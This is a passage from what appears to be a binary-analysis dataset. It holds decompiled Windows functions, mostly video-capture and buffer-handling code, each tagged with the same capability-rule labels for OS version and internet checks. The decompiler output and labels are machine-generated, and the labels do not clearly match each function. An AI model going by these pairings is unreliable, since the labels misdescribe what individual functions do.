        "decompiled_code": "\nuint32_t __fastcall fcn.004632c4(uint param_1, char param_2)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar7;\n    int32_t *piStack60;\n    uint uStack56;\n    uchar *puStack52;\n    int32_t *piStack48;\n    uint uStack44;\n    uint uStack40;\n    int32_t *piStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_5h;\n    \n    if (*(in_EAX + 0x28) == 0) {\n        uStack28 = 0x4632e7;\n        uStack28 = fcn.0040700c();\n        uStack32 = *0x4947dc;\n        piStack36 = *(in_EAX + 0x38);\n        uStack40 = 0x4632f9;\n        iVar3 = (***piStack36)();\n        if (iVar3 != 0) {\n            uStack28 = 0x463308;\n            fcn.0040700c();\n        }\n    }\n    if (*(in_EAX + 0x30) == 0) {\n        uStack28 = 0x46331c;\n        uStack28 = fcn.0040700c();\n        uStack32 = *0x494878;\n        piStack36 = *(in_EAX + 0x38);\n        uStack40 = 0x46332e;\n        iVar3 = (***piStack36)();\n        if (iVar3 != 0) {\n            uStack28 = 0x46333d;\n            fcn.0040700c();\n        }\n    }\n    uStack28 = 0x4634a0;\n    uStack32 = *(in_EAX + 0x38);\n    piStack36 = *(in_EAX + 0x14);\n    uStack40 = 0x463355;\n    uVar4 = (**(*piStack36 + 0xc))();\n    if ((uVar4 & 0x80000000) == 0) {\n        uStack40 = 0x4634bc;\n        uStack44 = *(in_EAX + 0x24);\n        piStack48 = *(in_EAX + 0x14);\n        puStack52 = 0x46337b;\n        uVar4 = (**(*piStack48 + 0xc))();\n        if ((uVar4 & 0x80000000) == 0) {\n            if (param_2 == '\\0') {\n                puStack52 = 0x4634dc;\n                uStack56 = *(in_EAX + 0x2c);\n                piStack60 = *(in_EAX + 0x14);\n                uVar4 = (**(*piStack60 + 0xc))();\n                if ((uVar4 & 0x80000000) != 0) {\n                    return uVar4;\n                }\n            }\n            puStack52 = 0x4633bf;\n            puVar5 = fcn.00402f00();\n            puStack52 = 0x4633cb;\n            puVar6 = fcn.00402f00();\n            puVar2 = *0x494a80;\n            puVar1 = *0x494a80 + 1;\n            *puVar5 = **0x494a80;\n            puVar5[1] = *puVar1;\n            puVar5[2] = puVar2[2];\n            puVar5[3] = puVar2[3];\n            puVar2 = *0x494bec;\n            puVar1 = *0x494bec + 1;\n            *puVar6 = **0x494bec;\n            puVar6[1] = *puVar1;\n            puVar6[2] = puVar2[2];\n            puVar6[3] = puVar2[3];\n            uStack56 = 0x46344c;\n            piStack60 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc4;\n            if (param_2 == '\\0') {\n                piVar7 = *(in_EAX + 0x18);\n                puStack52 = &stack0xfffffffc;\n                uVar4 = (**(*piVar7 + 0x1c))\n                                  (piVar7, puVar5, puVar6, *(in_EAX + 0x38), *(in_EAX + 0x24), *(in_EAX + 0x2c));\n            }\n            else {\n                piVar7 = *(in_EAX + 0x18);\n                puStack52 = &stack0xfffffffc;\n                uVar4 = (**(*piVar7 + 0x1c))(piVar7, puVar5, puVar6, *(in_EAX + 0x38), *(in_EAX + 0x24), 0);\n            }\n            *in_FS_OFFSET = piVar7;\n            if ((uVar4 & 0x80000000) == 0) {\n                if ((param_2 != '\\0') && (uVar4 = fcn.0046327c(),  (uVar4 & 0x80000000) != 0)) {\n                    return uVar4;\n                }\n                uVar4 = (**(**(in_EAX + 0xc) + 0x1c))(*(in_EAX + 0xc));\n                *(in_EAX + 0x1c) = 2;\n            }\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 1262
    },
    "00463504": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463504(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uchar in_CL;\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar2;\n    int32_t *piStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x46351a;\n    fcn.004059cc();\n    uStack28 = 0x463591;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.0040700c();\n    *(in_EAX + 0x44) = in_CL;\n    piVar2 = *(in_EAX + 0x18);\n    uVar1 = (**(*piVar2 + 0xc))(piVar2, *(in_EAX + 0x14));\n    if ((uVar1 & 0x80000000) == 0) {\n        uVar1 = fcn.004630c8(in_EAX + 0x38);\n        if ((uVar1 & 0x80000000) == 0) {\n            fcn.004637e4();\n            if (arg_8h != '\\0') {\n                fcn.004634f8();\n            }\n        }\n    }\n    *in_FS_OFFSET = piVar2;\n    piStack32 = 0x463598;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 351
    },
    "004635a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004635a4(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint var_118h;\n    uint var_114h;\n    int32_t var_110h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    var_8h = NULL;\n    var_ch = NULL;\n    puStack296 = 0x4635cf;\n    fcn.00405fe8();\n    uStack300 = 0x4636f2;\n    piStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed0;\n    puStack296 = &stack0xfffffffc;\n    fcn.0040700c();\n    fcn.0040700c();\n    uVar1 = fcn.0040700c();\n    iVar2 = (**(*param_2 + 0x28))(param_2, uVar1);\n    while (iVar2 == 0) {\n        uVar1 = fcn.0040700c(&fcn.004635a4::var_118h);\n        iVar2 = (**(*var_4h + 0xc))(var_4h, 1, uVar1);\n        if ((iVar2 == 0) && (var_8h != NULL)) {\n            uVar1 = fcn.0040700c();\n            iVar2 = (**(*var_8h + 0x18))(var_8h, uVar1);\n            if ((iVar2 == 0) && (var_ch != NULL)) {\n                uVar1 = fcn.004060ac();\n                iVar2 = (**(*var_ch + 0x20))(var_ch, uVar1);\n                if ((iVar2 == 0) && (var_110h == 0)) {\n                    fcn.004635a4();\n                    (**(**(in_EAX + 0x14) + 0x24))(*(in_EAX + 0x14), var_ch);\n                    (**(**(in_EAX + 0x14) + 0x24))(*(in_EAX + 0x14), var_8h);\n                    (**(**(in_EAX + 0x14) + 0x10))(*(in_EAX + 0x14), var_114h);\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = param_2;\n    piStack304 = 0x4636f9;\n    fcn.004060ac();\n    fcn.004060f8();\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 632
    },
    "00463718": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00463718(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x34) != 0) {\n        (**(**(in_EAX + 0x34) + 0x24))(*(in_EAX + 0x34), 0, 1);\n    }\n    if (*(in_EAX + 0xc) != 0) {\n        (**(**(in_EAX + 0xc) + 0x3c))(*(in_EAX + 0xc));\n    }\n    *(in_EAX + 0x1c) = 0;\n    if (*(in_EAX + 0x10) != 0) {\n        (**(**(in_EAX + 0x10) + 0x34))(*(in_EAX + 0x10), 0, 0x8001, 0);\n    }\n    if (*(in_EAX + 8) != 0) {\n        (**(**(in_EAX + 8) + 0x4c))(*(in_EAX + 8), 0);\n        (**(**(in_EAX + 8) + 0x74))(*(in_EAX + 8), 0);\n    }\n    return;\n}\n",
        "token_count": 274
    },
    "00463778": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00463778(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if (*(in_EAX + 0xc) != 0) {\n        if (param_2 == '\\0') {\n            uVar1 = (**(**(in_EAX + 0xc) + 0x24))(*(in_EAX + 0xc));\n            *(in_EAX + 0x1c) = 0;\n        }\n        else if (*(in_EAX + 0x1c) != '\\x02') {\n            uVar1 = (**(**(in_EAX + 0xc) + 0x1c))(*(in_EAX + 0xc));\n            *(in_EAX + 0x1c) = 2;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 199
    },
    "004637e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004637e4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint *in_FS_OFFSET;\n    uint uStack220;\n    uint uStack216;\n    uchar *puStack212;\n    uint var_c0h;\n    uint var_a8h;\n    int32_t *var_28h;\n    int32_t var_24h;\n    uint var_1dh;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    int32_t *var_4h;\n    \n    puStack212 = &stack0xfffffffc;\n    var_4h = NULL;\n    uStack216 = 0x463a86;\n    uStack220 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff24;\n    fcn.00406928(0);\n    var_8h = fcn.004637ac();\n    if (var_8h == 0) {\n        var_8h = (**(*var_4h + 0x14))(var_4h, &fcn.004637e4::var_18h, &fcn.004637e4::var_1dh + 1);\n    }\n    var_14h = 0;\n    if ((var_8h == 0) && (-1 < var_18h + -1)) {\n        var_24h = var_18h;\n        iVar3 = 0;\n        do {\n            var_ch = &fcn.004637e4::var_a8h;\n            var_8h = (**(*var_4h + 0x18))(var_4h, iVar3, &fcn.004637e4::var_10h, var_ch);\n            iVar2 = *(var_10h + 0x10);\n            var_28h = var_ch + 5;\n            if (((var_8h & 0x80000000) == 0) &&\n               (((cVar1 = fcn.004628b8(),  cVar1 != '\\0' || (iVar2 == 0x47504a4d)) ||\n                ((((iVar2 == 0x32595559 || ((iVar2 == 0x564e5559 || (iVar2 == 0x56595559)))) &&\n                  (*var_28h * var_28h[1] * 2 == *(var_10h + 0x28))) ||\n                 ((((iVar2 == 0x30323449 || (iVar2 == 0x32315659)) || (iVar2 == 0x56555949)) &&\n                  (*var_28h * var_28h[1] * 3 >> 1 == *(var_10h + 0x28))))))))) {\n                fcn.00406928(var_14h + 1);\n                iVar2 = var_14h;\n                *(*(in_EAX + 0x50) + 0xc + var_14h * 0x18) = iVar3;\n                *(*(in_EAX + 0x50) + var_14h * 0x18) = *var_28h;\n                *(*(in_EAX + 0x50) + 4 + var_14h * 0x18) = var_28h[1];\n                *(*(in_EAX + 0x50) + 0x10 + var_14h * 0x18) = var_10h;\n                *(*(in_EAX + 0x50) + 8 + var_14h * 0x18) = *(var_10h + 0x28);\n                cVar1 = fcn.004628b8();\n                if (cVar1 == '\\0') {\n                    fcn.004030fc();\n                }\n                else {\n                    *(*(in_EAX + 0x50) + 0x14 + iVar2 * 0x18) = *0x463a98;\n                }\n                var_14h = var_14h + 1;\n            }\n            iVar3 = iVar3 + 1;\n            var_24h = var_24h + -1;\n        } while (var_24h != 0);\n    }\n    if (1 < var_14h) {\n        do {\n            var_1dh._0_1_ = '\\0';\n            if (-1 < var_14h + -2) {\n                var_24h = var_14h + -1;\n                iVar3 = 0;\n                do {\n                    if ((*(*(in_EAX + 0x50) + 0x18 + iVar3 * 0x18) < *(*(in_EAX + 0x50) + iVar3 * 0x18)) ||\n                       ((*(*(in_EAX + 0x50) + iVar3 * 0x18) == *(*(in_EAX + 0x50) + 0x18 + iVar3 * 0x18) &&\n                        (*(*(in_EAX + 0x50) + 0x1c + iVar3 * 0x18) < *(*(in_EAX + 0x50) + 4 + iVar3 * 0x18))))) {\n                        var_1dh._0_1_ = '\\x01';\n                        puVar4 = *(in_EAX + 0x50) + iVar3 * 0x18;\n                        puVar5 = &fcn.004637e4::var_c0h;\n                        for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {\n                            *puVar5 = *puVar4;\n                            puVar4 = puVar4 + 1;\n                            puVar5 = puVar5 + 1;\n                        }\n                        puVar4 = *(in_EAX + 0x50) + 0x18 + iVar3 * 0x18;\n                        puVar5 = *(in_EAX + 0x50) + iVar3 * 0x18;\n                        for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {\n                            *puVar5 = *puVar4;\n                            puVar4 = puVar4 + 1;\n                            puVar5 = puVar5 + 1;\n                        }\n                        puVar4 = &fcn.004637e4::var_c0h;\n                        puVar5 = *(in_EAX + 0x50) + 0x18 + iVar3 * 0x18;\n                        for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {\n                            *puVar5 = *puVar4;\n                            puVar4 = puVar4 + 1;\n                            puVar5 = puVar5 + 1;\n                        }\n                    }\n                    iVar3 = iVar3 + 1;\n                    var_24h = var_24h + -1;\n                } while (var_24h != 0);\n            }\n        } while (var_1dh != '\\0');\n    }\n    *in_FS_OFFSET = uStack220;\n    puStack212 = 0x463a8d;\n    uStack216 = 0x463a85;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 1638
    },
    "00463e30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00463e30(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar2 = (*(in_EAX + 0x2c) + 1U) % *(in_EAX + 0x30);\n    puStack28 = 0x463e69;\n    (****(*(in_EAX + 0x28) + 0x1c + uVar2 * 0x20))();\n    uStack32 = 0x463f19;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n    iVar1 = *(in_EAX + 0x28) + uVar2 * 0x20;\n    puStack28 = &stack0xfffffffc;\n    if (*param_1 != *(iVar1 + 4)) {\n        *(iVar1 + 4) = *param_1;\n        puStack28 = &stack0xfffffffc;\n        fcn.00402f34();\n    }\n    *(iVar1 + 8) = *(in_EAX + 0x18);\n    *(iVar1 + 0xc) = *(in_EAX + 0x1c);\n    if (*(in_EAX + 0xb) == '\\0') {\n        *(iVar1 + 0x10) = *(in_EAX + 0x20);\n    }\n    else {\n        *(iVar1 + 0x10) = 0;\n    }\n    *(iVar1 + 0x18) = 0;\n    fcn.004030fc();\n    *(in_EAX + 0x2c) = uVar2;\n    fcn.0042ee24();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x463f20;\n    uStack32 = 0x463f18;\n    (**(**(*(in_EAX + 0x28) + 0x1c + uVar2 * 0x20) + 4))();\n    return;\n}\n",
        "token_count": 525
    },
    "00463f64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00463f64(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack32;\n    int32_t iStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    iStack32 = *param_2;\n    if (iStack32 == *(in_EAX + 0x38)) {\n        iStack28 = 0x463fde;\n        iStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &iStack32;\n        if (*(in_EAX + 10) == '\\0') {\n            *(in_EAX + 10) = 1;\n            fcn.0046492c();\n            if (*(in_EAX + 0x42) != 0) {\n                (**(in_EAX + 0x40))();\n            }\n            *(in_EAX + 10) = 0;\n        }\n        *in_FS_OFFSET = iStack32;\n    }\n    else {\n        puStack24 = param_2[2];\n        iStack28 = param_2[1];\n        iVar1 = sub.user32.dll_DefWindowProcA(*(in_EAX + 0x34));\n        param_2[3] = iVar1;\n    }\n    return;\n}\n",
        "token_count": 312
    },
    "00464020": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00464020(void)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = *(in_EAX + 0x30);\n    if (-1 < iVar3 + -1) {\n        iVar4 = 0;\n        do {\n            piVar1 = *(in_EAX + 0x28) + iVar4 * 0x20;\n            if ((0 < piVar1[1]) && (*piVar1 != 0)) {\n                fcn.00402f1c();\n            }\n            if (piVar1[5] != 0) {\n                fcn.00404650();\n            }\n            if (piVar1[7] != 0) {\n                fcn.00404650();\n            }\n            iVar2 = fcn.0042ee3c();\n            piVar1[7] = iVar2;\n            *piVar1 = 0;\n            piVar1[1] = 0;\n            piVar1[5] = 0;\n            piVar1[2] = 0;\n            piVar1[3] = 0;\n            *(piVar1 + 6) = 0;\n            iVar4 = iVar4 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 317
    },
    "004642b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004642b4(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    char cVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar4;\n    uint *arg_8h;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack52 = 0x4642d3;\n    var_ch = in_EAX;\n    var_4h = param_2;\n    fcn.004059cc();\n    uStack56 = 0x464446;\n    iStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    *(var_ch + 0xc) = 0;\n    *(var_ch + 0x10) = 0;\n    *(var_ch + 0x14) = 0;\n    puStack52 = &stack0xfffffffc;\n    fcn.00405530();\n    if (*(var_ch + 4) != 0) {\n        fcn.00464238();\n    }\n    if (var_10h < -1) {\n        var_10h = -1;\n    }\n    *(var_ch + 0xb) = var_10h == -1;\n    uVar1 = fcn.00462bb0(&fcn.004642b4::var_14h, 0, var_10h == -1);\n    *(var_ch + 4) = uVar1;\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffac;\n    iVar4 = 1;\n    uVar2 = fcn.00463504(1, &fcn.004642b4::var_8h);\n    cVar3 = '\\x01' - ((uVar2 & 0x80000000) != 0);\n    *in_FS_OFFSET = iVar4;\n    if (cVar3 != '\\0') {\n        if (var_10h == -1) {\n            arg_8h = &fcn.004642b4::var_20h;\n            uVar2 = fcn.00463b78(arg_8h);\n            if ((uVar2 & 0x80000000) == 0) {\n                *(var_ch + 0x18) = var_18h;\n                *(var_ch + 0x1c) = var_1ch;\n                *(var_ch + 0x20) = var_20h;\n            }\n            else {\n                cVar3 = '\\0';\n            }\n        }\n        else {\n            arg_8h = 0x4643ac;\n            cVar3 = fcn.00464d08();\n        }\n    }\n    if (cVar3 == '\\0') {\n        fcn.00464238();\n    }\n    else {\n        *(var_ch + 9) = 1;\n        fcn.00405584();\n        fcn.00463cc4(fcn.00463e30, var_ch);\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 767
    },
    "00464458": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00464458(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0x1c4b) == '\\0') {\n        iVar2 = 0;\n        do {\n            uVar1 = fcn.00403450(iVar2);\n            *(in_EAX + 0x4c + iVar2 * 4) = uVar1;\n            uVar1 = fcn.00403450(iVar2);\n            *(in_EAX + 0x44c + iVar2 * 4) = uVar1;\n            uVar1 = fcn.00403450(iVar2);\n            *(in_EAX + 0x84c + iVar2 * 4) = uVar1;\n            uVar1 = fcn.00403450(iVar2);\n            *(in_EAX + 0xc4c + iVar2 * 4) = uVar1;\n            uVar1 = fcn.00403450(iVar2);\n            *(in_EAX + 0x104c + iVar2 * 4) = uVar1;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 != 0x100);\n        fcn.00403af4();\n        iVar2 = 0;\n        do {\n            *(in_EAX + 0x184b + iVar2) = iVar2;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 != 0x100);\n        iVar2 = 0x100;\n        do {\n            *(in_EAX + 0x184b + iVar2) = 0xff;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 != 0x400);\n        *(in_EAX + 0x1c4b) = 1;\n    }\n    return;\n}\n",
        "token_count": 413
    },
    "0046492c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046492c(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x24) != 0) {\n        puStack12 = 0x464957;\n        var_4h = in_EAX;\n        fcn.004649c0();\n        if (*(*(var_4h + 0x24) + 0x50) < 1) {\n            puStack12 = 0x464968;\n            fcn.004253d0();\n            uStack16 = 0x4649b3;\n            uStack20 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffec;\n            arg_8h = *(*(var_4h + 0x28) + 0x14 + *(var_4h + 0x2c) * 0x20);\n            puStack12 = &stack0xfffffffc;\n            fcn.004252b0(arg_8h);\n            *in_FS_OFFSET = arg_8h;\n            uStack16 = 0x4649ba;\n            uStack20 = 0x4649b2;\n            fcn.00425608();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 311
    },
    "004649c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004649c0(uint param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uint uVar5;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_5h;\n    \n    uStack44 = 0x464bd7;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if ((*(param_2 + 6) != '\\0') || (*param_2 == 0)) goto code_r0x00464bbc;\n    if (param_2[5] == 0) {\n        iVar3 = fcn.004293dc();\n        param_2[5] = iVar3;\n    }\n    iVar3 = (**(*param_2[5] + 0x2c))();\n    if ((iVar3 != param_2[2]) || (iVar3 = (**(*param_2[5] + 0x20))(),  iVar3 != param_2[3])) {\n        fcn.0042a930();\n        (**(*param_2[5] + 0x40))();\n        (**(*param_2[5] + 0x34))();\n    }\n    bVar2 = false;\n    uVar5 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    iVar3 = param_2[4];\n    if (iVar3 < 0x3259555a) {\n        if (iVar3 == 0x32595559) goto code_r0x00464ab9;\n        if (iVar3 == 0) {\n            if (param_2[2] * param_2[3] * 3 == param_2[1]) {\n                fcn.00429b20();\n                fcn.004030fc();\n            }\n            else {\n                bVar2 = true;\n            }\n        }\n        else {\n            if ((iVar3 == 0x30323449) || (iVar3 == 0x32315659)) goto code_r0x00464ad8;\ncode_r0x00464aff:\n            bVar2 = true;\n        }\n    }\n    else {\n        if (iVar3 != 0x564e5559) {\n            if (iVar3 == 0x56555949) {\ncode_r0x00464ad8:\n                uVar1 = param_2[2] * param_2[3] * 3;\n                iVar3 = uVar1 >> 1;\n                if (iVar3 < 0) {\n                    iVar3 = iVar3 + ((uVar1 & 1) != 0);\n                }\n                if (iVar3 == param_2[1]) {\n                    fcn.004645b8();\n                }\n                else {\n                    bVar2 = true;\n                }\n                goto code_r0x00464b01;\n            }\n            if (iVar3 != 0x56595559) goto code_r0x00464aff;\n        }\ncode_r0x00464ab9:\n        if (param_2[2] * param_2[3] * 2 == param_2[1]) {\n            fcn.004647b0();\n        }\n        else {\n            bVar2 = true;\n        }\n    }\ncode_r0x00464b01:\n    if (bVar2) {\n        if (param_2[4] != 0) {\n            fcn.004030fc();\n        }\n        uVar5 = 0x464bf8;\n        uStack44 = 0x464b41;\n        fcn.004299b0();\n        uStack44 = 0x464b4a;\n        fcn.0042548c(uVar5);\n        uStack44 = 0x464c14;\n        uStack48 = 0x464b5a;\n        fcn.00409d70();\n        uStack48 = 0;\n        fcn.00405794();\n        fcn.004058e0();\n        uVar5 = 0;\n        fcn.004299b0();\n        uVar4 = fcn.0042558c();\n        fcn.004299b0(uVar4);\n        fcn.0042548c(uVar5);\n    }\n    *(param_2 + 6) = 1;\n    *in_FS_OFFSET = uVar5;\ncode_r0x00464bbc:\n    *in_FS_OFFSET = uStack48;\n    uStack44 = 0x464bd6;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1039
    },
    "00464c40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00464c40(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    piVar1 = *(in_EAX + 0x28) + param_1 * 0x20;\n    puStack28 = 0x464c6c;\n    (***piVar1[7])();\n    uStack32 = 0x464ce3;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if ((((*piVar1 != 0) && (0 < piVar1[2])) && (0 < piVar1[3])) && (0 < piVar1[1])) {\n        puStack28 = &fcn.00464c40::var_1h + 1;\n        fcn.004649c0();\n        if (*(piVar1 + 6) != '\\0') {\n            (**(*param_2 + 8))();\n            var_1h._0_1_ = 1;\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x464cea;\n    uStack32 = 0x464ce2;\n    (**(*piVar1[7] + 4))();\n    return;\n}\n",
        "token_count": 374
    },
    "00464d08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
